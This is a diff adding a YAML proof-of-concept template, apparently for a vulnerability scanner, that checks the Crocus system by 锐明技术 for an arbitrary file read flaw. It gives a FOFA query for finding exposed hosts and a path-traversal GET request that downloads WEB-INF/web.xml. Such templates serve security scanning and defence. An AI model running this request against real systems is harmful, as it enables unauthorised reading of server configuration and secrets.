@@ -1,0 +1,16 @@
+id: poc-yaml-crocus-devicefileupload-do-anyfile-read
+info:
+  name: 锐明技术 Crocus系统 DeviceFileUpload.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: crocus
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+requests:
+- method: GET
+  path: /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"web-app\") &&\ncontains(body,\"\
+    <display-name><\") &&\ncontains(headers,\"filename=web.xml\") &&\ncontains(content_type,\"\
+    application/octet-stream\")\n"
+variables: {}
+transport: http
